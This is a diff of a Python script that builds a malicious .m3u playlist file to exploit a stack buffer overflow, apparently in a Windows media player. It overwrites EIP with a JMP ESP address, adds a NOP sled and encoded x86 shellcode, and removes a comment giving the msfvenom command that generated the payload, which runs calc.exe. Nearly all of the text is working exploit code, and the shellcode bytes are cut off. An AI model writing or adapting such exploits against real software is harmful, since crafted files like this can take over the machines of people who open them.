@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 #Using JMP ESP in EIP
 FILE_NAME = 'exploit.m3u'
 
@@ -11,9 +13,6 @@ junk1 = '\x41' * (25000 + offset)
 eip = '\x2a\xb2\xe1\x01' 
 nop = '\x90' * 25
 
-#Shellcode created by:
-#msfvenom -a x86 -p windows/exec CMD=calc.exe -f python -b '\x00'
-#--var-name shellcode -e x86/shikata_ga_nai EXITFUNC=seh
 shellcode =  ""
 shellcode += "\xdb\xd3\xb8\xc9\x19\x3e\xa4\xd9\x74\x24\xf4\x5f"
 shellcode += "\x33\xc9\xb1\x31\x31\x47\x18\x83\xc7\x04\x03\x47"
